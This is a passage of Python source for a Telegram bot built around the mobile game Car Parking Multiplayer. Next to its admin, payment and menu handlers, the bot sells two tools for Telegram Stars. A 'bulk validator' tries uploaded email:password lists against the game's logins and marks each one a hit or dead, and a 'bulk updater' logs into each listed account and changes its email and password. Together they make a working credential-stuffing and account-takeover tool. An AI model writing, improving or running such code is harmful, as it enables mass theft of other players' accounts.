        await update.message.reply_text(t(update.effective_user.id, "find_usage"), parse_mode=ParseMode.HTML)

async def addadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text(t(update.effective_user.id, "only_owner"), parse_mode=ParseMode.HTML)
        return
    try:
        target_id = int(context.args[0])
        users_col.update_one({"_id": target_id}, {"$set": {"role": "admin", "status": "approved", "expiry": None}}, upsert=True)
        await update_admin_menu(context.bot, target_id, make_admin=True)
        await update.message.reply_text(t(update.effective_user.id, "promote_success", uid=target_id), parse_mode=ParseMode.HTML)
        try: await context.bot.send_message(target_id, t(target_id, "promote_success", uid=target_id), parse_mode=ParseMode.HTML)
        except: pass
    except:
        await update.message.reply_text(t(update.effective_user.id, "addadmin_usage"), parse_mode=ParseMode.HTML)

async def remadmin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text(t(update.effective_user.id, "only_owner"), parse_mode=ParseMode.HTML)
        return
    try:
        target_id = int(context.args[0])
        users_col.update_one({"_id": target_id}, {"$set": {"role": "user"}})
        await update_admin_menu(context.bot, target_id, make_admin=False)
        await update.message.reply_text(t(update.effective_user.id, "demote_success", uid=target_id), parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(t(update.effective_user.id, "remadmin_usage"), parse_mode=ParseMode.HTML)

async def logs_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        target_id = int(context.args[0])
        user_logs = list(logs_col.find({"user_id": target_id}).sort("timestamp", -1).limit(15))
        if not user_logs:
            await update.message.reply_text(f"{get_emoji('error_fail')} No logs found for ID: <code>{target_id}</code>", parse_mode=ParseMode.HTML)
            return
        
        text = f"{get_emoji('stats')} <b>USER LOGS: <code>{target_id}</code></b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for log in user_logs:
            dt = log['timestamp'].split('T')[0] + " " + log['timestamp'].split('T')[1][:5]
            text += f"📅 <b>{dt}</b>\n⚙️ Action: <code>{log['action']}</code>\n"
            if log.get('details'):
                text += f"📝 Details: {log['details']}\n"
            text += "━━━━━━━━━━━━━━━━━━━━\n"
        
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(f"{get_emoji('error_fail')} Usage: <code>/logs [user_id]</code>", parse_mode=ParseMode.HTML)

# ==================== LIQUID UI CALLBACKS ====================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    user_id = user.id
    if is_blocked(user_id): return ConversationHandler.END

    action = query.data
    db_user = track_and_get_user(user)

    if action.startswith("setlang_"):
        lang_code = action.split("_")[1]
        if lang_code in LANGUAGES:
            users_col.update_one({"_id": user_id}, {"$set": {"language": lang_code}})
            welcome_text = t(user_id, "welcome", name=user.first_name or "Player")
            await query.edit_message_text(welcome_text, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(user_id))
            return ConversationHandler.END

    if action == "change_lang":
        await query.edit_message_text(f"{get_emoji('main_logo')} <b>Language Selection</b>\n━━━━━━━━━━━━━━━━━━━━\n{t(user_id, 'choose_lang')}", parse_mode=ParseMode.HTML, reply_markup=language_kb())
        return AWAIT_LANGUAGE

    if action == "req_access":
        username = f"@{user.username}" if user.username else user.first_name
        req_text = f"{get_emoji('new_request_alert')} <b>NEW VIP REQUEST</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('user')} User: {username}\n{get_emoji('user_id')} ID: <code>{user_id}</code>\n\nSelect approval duration:"
        for adm in get_all_admins():
            try: await context.bot.send_message(adm, req_text, parse_mode=ParseMode.HTML, reply_markup=admin_approve_kb(user_id))
            except: pass
        await query.edit_message_text(t(user_id, "request_sent"), parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    if action.startswith("apprv_") or action.startswith("reject_"):
        if not is_admin(user_id): return ConversationHandler.END
        parts = action.split("_")
        target_id = int(parts[-1])
        if action.startswith("reject"):
            users_col.update_one({"_id": target_id}, {"$set": {"status": "rejected"}})
            await query.edit_message_text(f"{get_emoji('error_fail')} User <code>{target_id}</code> rejected.", parse_mode=ParseMode.HTML)
            try: await context.bot.send_message(target_id, f"{get_emoji('error_fail')} Your VIP request was rejected.", parse_mode=ParseMode.HTML)
            except: pass
        else:
            duration = parts[1]
            expiry = None
            if duration == "1d": expiry = time.time() + 86400
            elif duration == "7d": expiry = time.time() + (7 * 86400)
            users_col.update_one({"_id": target_id}, {"$set": {"status": "approved", "expiry": expiry}})
            dur_text = "Lifetime" if not expiry else ("1 Day" if duration == "1d" else "7 Days")
            await query.edit_message_text(f"{get_emoji('success')} User <code>{target_id}</code> approved for {dur_text}.", parse_mode=ParseMode.HTML)
            try: await context.bot.send_message(target_id, f"{get_emoji('success')} <b>VIP ACCESS GRANTED</b>\n━━━━━━━━━━━━━━━━━━━━\nYour account has been approved ({dur_text}).\nType /start to begin.", parse_mode=ParseMode.HTML)
            except: pass
        return ConversationHandler.END

    if is_global_lock() and not is_admin(user_id):
        if db_user.get("status") != "approved":
            await query.edit_message_text(t(user_id, "pending_text", name=user.first_name), parse_mode=ParseMode.HTML, reply_markup=request_access_kb())
            return ConversationHandler.END

    if action == "close_menu":
        await query.delete_message()
        return ConversationHandler.END

    if action == "about":
        await query.edit_message_text(t(user_id, "about_text"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
        return ConversationHandler.END

    if action == "help":
        await query.edit_message_text(t(user_id, "help_text"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
        return ConversationHandler.END

    if action == "menu":
        if user_id in sessions:
            text = (
                f"{get_emoji('success')} <b>AUTHENTICATION SUCCESSFUL</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"{get_emoji('game_cpm_login')} <b>Game:</b> {sessions[user_id]['game'].upper()}\n"
                f"{get_emoji('email')} <b>{t(user_id, 'registered_email')}</b>\n"
                f"<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n\n"
                "<i>Select an action from the dashboard:</i>"
            )
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
        else:
            await query.edit_message_text(t(user_id, "welcome", name=user.first_name), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(user_id))
        return ConversationHandler.END

    if action == "ask_upd":
        await query.edit_message_text(f"{get_emoji('bulk_updator')} <b>{t(user_id, 'bulk_updater_select')}</b>", parse_mode=ParseMode.HTML, reply_markup=ask_version_kb(user_id, "bulk_upd"))
        return ConversationHandler.END
    if action == "ask_val":
        await query.edit_message_text(f"{get_emoji('bulk_validator_find_user')} <b>{t(user_id, 'bulk_validator_select')}</b>", parse_mode=ParseMode.HTML, reply_markup=ask_version_kb(user_id, "bulk_val"))
        return ConversationHandler.END

    # ==================== PAYMENT GATE FOR BULK ACTIONS ====================
    if action in ["bulk_upd_cpm1", "bulk_upd_cpm2", "bulk_val_cpm1", "bulk_val_cpm2"]:
        game_ver = "cpm1" if "cpm1" in action else "cpm2"
        context.user_data["game_version"] = game_ver
        
        # Check if user is VIP/Admin
        if is_vip(user_id):
            # FREE ACCESS FOR VIP
            if "bulk_upd" in action:
                text = (
                    f"{get_emoji('bulk_updator')} <b>BULK UPDATER ({game_ver.upper()})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"{get_emoji('format_tool')} <b>{t(user_id, 'bulk_step1')}</b>\n"
                    f"{t(user_id, 'bulk_format')}\n\n"
                    f"{get_emoji('arrow_down')} <b>Upload / Paste below:</b>\n\n"
                    f"<i>✨ VIP Access: Free of charge!</i>"
                )
                await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
                return AWAIT_BULK_FILE
            else:
                text = (
                    f"{get_emoji('bulk_validator_find_user')} <b>BULK VALIDATOR ({game_ver.upper()})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"{get_emoji('format_tool')} <b>Format:</b> <code>Email : Password</code>\n\n"
                    f"{get_emoji('arrow_down')} <b>Upload / Paste below:</b>\n\n"
                    f"<i>✨ VIP Access: Free of charge!</i>"
                )
                await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
                return AWAIT_VALIDATOR_DATA
        else:
            # PAID ACCESS FOR NON-VIP
            price = 25 if "bulk_upd" in action else 15
            title = "Bulk Updater" if "bulk_upd" in action else "Bulk Validator"
            context.user_data["pending_payment_action"] = action
            
            await context.bot.send_invoice(
                chat_id=user_id,
                title=f"{title} ({game_ver.upper()})",
                description=f"Unlock one-time use of {title} for Car Parking Multiplayer.",
                payload=action,
                provider_token="",
                currency="XTR",
                prices=[LabeledPrice(label=title, amount=price)]
            )
            await query.edit_message_text(
                f"💳 <b>PAYMENT REQUIRED</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f"To use <b>{title}</b>, you need to pay <b>{price} Telegram Stars</b>.\n\n"
                f"An invoice has been sent to this chat. Please complete the payment to proceed.\n\n"
                f"<i>Tip: VIP users get this feature for free!</i>",
                parse_mode=ParseMode.HTML
            )
            return AWAIT_PAYMENT

    if action in ["sel_cpm1", "sel_cpm2"]:
        game_ver = "cpm1" if action == "sel_cpm1" else "cpm2"
        context.user_data["game_version"] = game_ver
        text = f"{get_emoji('login_portal')} <b>{t(user_id, 'login_portal', game=game_ver.upper())}</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('email')} <b>{t(user_id, 'provide_email')}</b>"
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
        return AWAIT_EMAIL_LOGIN

    if action == "info":
        if user_id not in sessions: return ConversationHandler.END
        info = (
            f"{get_emoji('user')} <b>{t(user_id, 'profile_overview')}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{get_emoji('game_cpm_login')} <b>Game:</b> <code>{sessions[user_id]['game'].upper()}</code>\n"
            f"{get_emoji('email')} <b>{t(user_id, 'registered_email')}:</b>\n<blockquote><code>{sessions[user_id]['email']}</code></blockquote>\n"
            f"{get_emoji('system_info')} <b>{t(user_id, 'database_sync')}:</b> {get_emoji('loaded')} <i>{t(user_id, 'connected')}</i>\n━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(info, parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
        return ConversationHandler.END

    if action == "change_email":
        if user_id not in sessions: return ConversationHandler.END
        await query.edit_message_text(t(user_id, "update_email_msg"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
        return AWAIT_NEW_EMAIL

    if action == "change_pass":
        if user_id not in sessions: return ConversationHandler.END
        await query.edit_message_text(t(user_id, "update_password_msg"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
        return AWAIT_NEW_PASSWORD

    if action == "logout":
        sessions.pop(user_id, None)
        await query.edit_message_text(t(user_id, "session_terminated_msg"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
        return ConversationHandler.END

    if action.startswith("adm_"):
        if not is_admin(user_id): return ConversationHandler.END
        if action == "adm_stats":
            users = users_col.count_documents({})
            approved = users_col.count_documents({"status": "approved"})
            pending = users_col.count_documents({"status": "pending"})
            text = t(user_id, "stats_text", users=users, approved=approved, pending=pending, active=len(sessions))
            await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
            return ConversationHandler.END
        elif action == "adm_users":
            await query.edit_message_text(f"{get_emoji('loading')} <i>Extracting user database...</i>", parse_mode=ParseMode.HTML)
            all_users = list(users_col.find({}))
            if not all_users:
                await query.edit_message_text(t(user_id, "no_users"), reply_markup=admin_kb(user_id), parse_mode=ParseMode.HTML)
                return ConversationHandler.END
            file_content = "GLITCHYN CPM - FULL USER DATABASE\n" + "="*50 + "\n\n"
            for u in all_users:
                uid = u.get("_id", "N/A")
                username = u.get("username", "No Username")
                name = u.get("first_name", "No Name")
                role = u.get("role", "user").upper()
                status = u.get("status", "pending").upper()
                joined = u.get("joined", "").split("T")[0] if u.get("joined") else "Unknown"
                file_content += f"ID: {uid} | @{username} ({name}) | Role: {role} | Status: {status} | Joined: {joined}\n"
            filename = f"Users_DB_{datetime.now().strftime('%H%M%S')}.txt"
            with open(filename, "w", encoding="utf-8") as f: f.write(file_content)
            await context.bot.send_document(chat_id=user_id, document=open(filename, "rb"), caption=f"{get_emoji('user_list')} <b>USER DATABASE EXPORTED</b>", parse_mode=ParseMode.HTML)
            os.remove(filename)
            await query.edit_message_text(t(user_id, "db_exported"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
            return ConversationHandler.END
        elif action == "adm_broadcast":
            await query.edit_message_text(t(user_id, "broadcast_text"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
            return AWAIT_BROADCAST
        elif action == "adm_block":
            await query.edit_message_text(t(user_id, "block_text"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
            return AWAIT_BLOCK_ID
        elif action == "adm_unblock":
            await query.edit_message_text(t(user_id, "unblock_text"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
            return AWAIT_UNBLOCK_ID
        return ConversationHandler.END
    return ConversationHandler.END

# ==================== PAYMENT HANDLERS ====================
async def precheckout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Answers the PreCheckoutQuery"""
    query = update.pre_checkout_query
    if query.invoice_payload in ["bulk_upd_cpm1", "bulk_upd_cpm2", "bulk_val_cpm1", "bulk_val_cpm2"]:
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="Something went wrong with the payment payload.")

async def successful_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Confirms the successful payment."""
    user_id = update.effective_user.id
    payment = update.message.successful_payment
    action = payment.invoice_payload
    game_ver = "cpm1" if "cpm1" in action else "cpm2"
    context.user_data["game_version"] = game_ver
    
    # Log the payment
    log_action(user_id, "payment", f"Action: {action} | Amount: {payment.total_amount} Stars")
    
    if "bulk_upd" in action:
        text = (
            f"{get_emoji('success')} <b>PAYMENT SUCCESSFUL!</b>\n\n"
            f"{get_emoji('bulk_updator')} <b>BULK UPDATER ({game_ver.upper()})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{get_emoji('format_tool')} <b>{t(user_id, 'bulk_step1')}</b>\n"
            f"{t(user_id, 'bulk_format')}\n\n"
            f"{get_emoji('arrow_down')} <b>Upload / Paste below:</b>"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
        return AWAIT_BULK_FILE
    elif "bulk_val" in action:
        text = (
            f"{get_emoji('success')} <b>PAYMENT SUCCESSFUL!</b>\n\n"
            f"{get_emoji('bulk_validator_find_user')} <b>BULK VALIDATOR ({game_ver.upper()})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"{get_emoji('format_tool')} <b>Format:</b> <code>Email : Password</code>\n\n"
            f"{get_emoji('arrow_down')} <b>Upload / Paste below:</b>"
        )
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
        return AWAIT_VALIDATOR_DATA
    
    return ConversationHandler.END

# ==================== BACKGROUND TASK WORKERS ====================
async def background_updater(chat_id, lines, game_ver, email_rule, pass_rule, bot, msg_id, user_id):
    results = []
    success_count = 0
    for line in lines:
        try:
            parts = line.split(':')
            if len(parts) < 2: continue
            old_e, old_p = parts[0].strip(), parts[1].strip()
            login_res = await cpm_login(game_ver, old_e, old_p)
            if not login_res.get("ok"): results.append(f"✖️ {old_e} : LOGIN ERR"); continue
            token = login_res["data"]["idToken"]
            final_email, final_pass = old_e, old_p
            if email_rule == 'RANDOM':
                target_e = generate_random_email()
                email_res = await cpm_change_email(game_ver, token, target_e)
                if email_res.get("ok"):
                    token = email_res["data"]["idToken"]
                    final_email = target_e
                else:
                    results.append(f"✖️ {old_e} : EMAIL ERR"); continue
            if pass_rule != 'SKIP':
                pass_res = await cpm_change_password(game_ver, token, pass_rule)
                if pass_res.get("ok"): final_pass = pass_rule
                else: results.append(f"✖️ {final_email} : PASS ERR"); continue
            results.append(f"✨ {final_email}:{final_pass}")
            success_count += 1
        except: pass
        await asyncio.sleep(1.5)
        
    log_action(user_id, "bulk_update", f"Game: {game_ver} | Success: {success_count} | Total: {len(lines)} | Email Rule: {email_rule} | Pass Rule: {pass_rule}")
    
    output = f"Bulk_Update_{game_ver.upper()}_{datetime.now().strftime('%H%M%S')}.txt"
    with open(output, "w", encoding="utf-8") as f: f.write("\n".join(results))
    await bot.send_document(chat_id=chat_id, document=open(output, "rb"), caption=f"{get_emoji('bulk_updator')} <b>UPDATER COMPLETE ({game_ver.upper()})</b>", parse_mode=ParseMode.HTML)
    try: await bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except: pass
    os.remove(output)

async def background_validator(chat_id, lines, game_ver, bot, msg_id, user_id):
    results = []
    hits, deads = 0, 0
    for line in lines:
        try:
            parts = line.split(':')
            if len(parts) != 2: continue
            email, pwd = [p.strip() for p in parts]
            login_res = await cpm_login(game_ver, email, pwd)
            if login_res.get("ok"): results.append(f"✨ HIT : {email}:{pwd}"); hits += 1
            else: results.append(f"✖️ DEAD : {email}:{pwd}"); deads += 1
        except: pass
        await asyncio.sleep(1.2)
        
    log_action(user_id, "bulk_validate", f"Game: {game_ver} | Hits: {hits} | Dead: {deads} | Total: {len(lines)}")
    
    output = f"Validator_Result_{game_ver.upper()}_{datetime.now().strftime('%H%M%S')}.txt"
    with open(output, "w", encoding="utf-8") as f: f.write("\n".join(results))
    await bot.send_document(chat_id=chat_id, document=open(output, "rb"), caption=f"{get_emoji('bulk_validator_find_user')} <b>VALIDATION COMPLETE ({game_ver.upper()})</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('success')} <b>Hits:</b> {hits}\n{get_emoji('error_fail')} <b>Dead:</b> {deads}", parse_mode=ParseMode.HTML)
    try: await bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except: pass
    os.remove(output)

# ==================== DATA PROCESSING ROUTERS ====================
async def receive_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    lines = []
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        lines = [line for line in file_content.decode('utf-8').split('\n') if line.strip()]
    else:
        lines = [line for line in update.message.text.strip().split('\n') if line.strip()]
    if not lines:
        await update.message.reply_text(t(user_id, "format_no_data"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
        return ConversationHandler.END
    context.user_data["bulk_lines"] = lines
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="ꜱᴇᴛ ʀᴀɴᴅᴏᴍ ᴇᴍᴀɪʟꜱ", callback_data="bulk_em_random", icon_custom_emoji_id=EMOJIS["random_email"])],
        [InlineKeyboardButton(text="ꜱᴋɪᴘ (ᴅᴏɴ'ᴛ ᴄʜᴀɴɢᴇ)", callback_data="bulk_em_skip", icon_custom_emoji_id=EMOJIS["skip"])],
        [InlineKeyboardButton(text=t(user_id, "abort"), callback_data="menu", icon_custom_emoji_id=EMOJIS["error_fail"])]
    ])
    text = f"{get_emoji('loaded')} {t(user_id, 'loaded_accounts', count=len(lines))}\n\n{get_emoji('format_tool')} <b>{t(user_id, 'bulk_step2')}</b>\n━━━━━━━━━━━━━━━━━━━━\n{t(user_id, 'bulk_step2_msg')}"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    return AWAIT_BULK_NEW_EMAIL

async def bulk_email_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    if query.data == "menu": return await menu_callback(update, context)
    choice = "RANDOM" if query.data == "bulk_em_random" else "SKIP"
    context.user_data["bulk_new_email"] = choice
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="ꜱᴋɪᴘ (ᴅᴏɴ'ᴛ ᴄʜᴀɴɢᴇ)", callback_data="bulk_pw_skip", icon_custom_emoji_id=EMOJIS["skip"])],
        [InlineKeyboardButton(text=t(user_id, "abort"), callback_data="menu", icon_custom_emoji_id=EMOJIS["error_fail"])]
    ])
    text = f"{get_emoji('format_tool')} <b>{t(user_id, 'bulk_step3')}</b>\n━━━━━━━━━━━━━━━━━━━━\n{t(user_id, 'bulk_step3_msg')}"
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)
    return AWAIT_BULK_NEW_PASS

async def bulk_pass_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    new_pass = "SKIP"
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        if query.data == "menu": return await menu_callback(update, context)
        msg_id = query.message.message_id
        await query.edit_message_text(f"{get_emoji('loading')} <i>{t(user_id, 'bulk_starting')}</i>", parse_mode=ParseMode.HTML)
    else:
        new_pass = update.message.text.strip()
        msg = await update.message.reply_text(f"{get_emoji('loading')} <i>{t(user_id, 'bulk_starting')}</i>", parse_mode=ParseMode.HTML)
        msg_id = msg.message_id
    game_ver = context.user_data.get("game_version", "cpm2")
    lines = context.user_data.get("bulk_lines", [])
    new_em_choice = context.user_data.get("bulk_new_email", "SKIP")
    asyncio.create_task(background_updater(chat_id, lines, game_ver, new_em_choice, new_pass, context.bot, msg_id, user_id))
    return ConversationHandler.END

async def process_validator_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    game_ver = context.user_data.get("game_version", "cpm2")
    lines = []
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        lines = [line for line in file_content.decode('utf-8').split('\n') if line.strip()]
    else:
        lines = [line for line in update.message.text.strip().split('\n') if line.strip()]
    msg = await update.message.reply_text(f"{get_emoji('loading')} <i>{t(user_id, 'validator_starting', count=len(lines), game=game_ver.upper())}</i>", parse_mode=ParseMode.HTML)
    asyncio.create_task(background_validator(update.effective_chat.id, lines, game_ver, context.bot, msg.message_id, user_id))
    return ConversationHandler.END

# ==================== ACCOUNT OPERATIONS ====================
async def login_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    context.user_data["email"] = update.message.text.strip().lower()
    game = context.user_data.get("game_version", "cpm2").upper()
    await update.message.reply_text(f"{get_emoji('login_portal')} <b>{t(user_id, 'login_portal', game=game)}</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('email')} <b>{t(user_id, 'target_email')}</b> <code>{context.user_data['email']}</code>\n\n{get_emoji('password_security')} {t(user_id, 'provide_password')}", parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
    return AWAIT_PASSWORD_LOGIN

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    email = context.user_data.get("email")
    game_ver = context.user_data.get("game_version", "cpm2")
    try: await update.message.delete()
    except: pass
    msg = await update.message.reply_text(f"{get_emoji('loading')} <i>{t(user_id, 'authenticating')}</i>", parse_mode=ParseMode.HTML)
    result = await cpm_login(game_ver, email, password)
    if result.get("ok"):
        sessions[user_id] = {"idToken": result["data"]["idToken"], "email": result["data"]["email"], "uid": result["data"].get("localId", "?"), "game": game_ver}
        log_action(user_id, "login", f"Game: {game_ver} | Email: {email}")
        await msg.edit_text(f"{get_emoji('success')} <b>{t(user_id, 'auth_success', game=game_ver.upper())}</b>", parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
    else:
        await msg.edit_text(t(user_id, "auth_failed") + f"\n{result.get('error')}", parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
    return ConversationHandler.END

async def new_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    new_email = update.message.text.strip()
    session = sessions.get(user_id)
    if not session: return ConversationHandler.END
    if new_email.upper() == 'RANDOM': new_email = generate_random_email()
    msg = await update.message.reply_text(f"{get_emoji('loading')} <i>Syncing changes...</i>", parse_mode=ParseMode.HTML)
    result = await cpm_change_email(session["game"], session["idToken"], new_email)
    if result.get("ok"):
        session["idToken"] = result["data"]["idToken"]
        session["email"] = result["data"].get("email", new_email)
        log_action(user_id, "change_email", f"Game: {session['game']} | New Email: {new_email}")
        await msg.edit_text(t(user_id, "credentials_updated", email=new_email), parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
    else:
        await msg.edit_text(result.get("error", "Error"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
    return ConversationHandler.END

async def new_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    pwd = update.message.text.strip()
    try: await update.message.delete()
    except: pass
    context.user_data["new_password"] = pwd
    await update.message.reply_text(t(user_id, "confirm_security"), parse_mode=ParseMode.HTML, reply_markup=cancel_kb(user_id))
    return AWAIT_CONFIRM_PASSWORD

async def confirm_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    confirm = update.message.text.strip()
    new_pwd = context.user_data.get("new_password")
    try: await update.message.delete()
    except: pass
    if confirm != new_pwd:
        await update.message.reply_text(t(user_id, "mismatch_error"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
        return ConversationHandler.END
    session = sessions.get(user_id)
    if not session: return ConversationHandler.END
    msg = await update.message.reply_text(f"{get_emoji('loading')} <i>Deploying...</i>", parse_mode=ParseMode.HTML)
    result = await cpm_change_password(session["game"], session["idToken"], new_pwd)
    if result.get("ok"):
        session["idToken"] = result["data"]["idToken"]
        log_action(user_id, "change_password", f"Game: {session['game']} | Email: {session['email']}")
        await msg.edit_text(t(user_id, "security_updated"), parse_mode=ParseMode.HTML, reply_markup=logged_menu_kb(user_id))
    else:
        await msg.edit_text(result.get("error", "Error"), parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
    return ConversationHandler.END

async def do_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id): return ConversationHandler.END
    msg = await update.message.reply_text(f"{get_emoji('loading')} <i>Transmitting...</i>", parse_mode=ParseMode.HTML)
    sent, failed = 0, 0
    for u in users_col.find():
        try:
            await context.bot.send_message(int(u["_id"]), f"{get_emoji('broadcast')} <b>SYSTEM BROADCAST</b>\n━━━━━━━━━━━━━━━━━━━━\n\n{update.message.text}", parse_mode=ParseMode.HTML)
            sent += 1
        except: failed += 1
    await msg.edit_text(f"{get_emoji('success')} <b>TRANSMISSION COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━\n{get_emoji('broadcast_delivery')} <b>Delivered:</b> {sent}\n{get_emoji('error_fail')} <b>Failed:</b> {failed}", parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
    return ConversationHandler.END

async def do_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id): return ConversationHandler.END
    try:
        block_user(int(update.message.text.strip()))
        await update.message.reply_text(t(user_id, "block_success"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
    except:
        await update.message.reply_text(t(user_id, "invalid_id"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
    return ConversationHandler.END

async def do_unblock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id): return ConversationHandler.END
    try:
        unblock_user(int(update.message.text.strip()))
        await update.message.reply_text(t(user_id, "unblock_success"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
    except:
        await update.message.reply_text(t(user_id, "invalid_id"), parse_mode=ParseMode.HTML, reply_markup=admin_kb(user_id))
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(f"{get_emoji('error_fail')} <i>Operation aborted.</i>", parse_mode=ParseMode.HTML, reply_markup=back_kb(user_id))
    return ConversationHandler.END

# ==================== MAIN EXECUTION ====================
def main():
    keep_alive()
    app = Application.builder().token(BOT_TOKEN).post_init(setup_commands).build()
    
    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", start), 
            CommandHandler("admin", admin_cmd),
            CommandHandler("profile", profile_cmd),
            CommandHandler("lock", lock_bot),
            CommandHandler("unlock", unlock_bot),
            CommandHandler("revoke", revoke_cmd),
            CommandHandler("find", find_cmd),
            CommandHandler("addadmin", addadmin_cmd),
            CommandHandler("remadmin", remadmin_cmd),
            CommandHandler("logs", logs_cmd),
            CommandHandler("format", format_cmd),
            CallbackQueryHandler(menu_callback)
        ],
        states={
            AWAIT_LANGUAGE: [CallbackQueryHandler(menu_callback)],
            AWAIT_EMAIL_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_email)],
            AWAIT_PASSWORD_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
            AWAIT_NEW_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, new_email)],
            AWAIT_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, new_password)],
            AWAIT_CONFIRM_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_password)],
            AWAIT_BROADCAST: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_broadcast)],
            AWAIT_BLOCK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_block)],
            AWAIT_UNBLOCK_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, do_unblock)],
            AWAIT_BULK_FILE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_bulk_file), MessageHandler(filters.Document.MimeType("text/plain"), receive_bulk_file)],
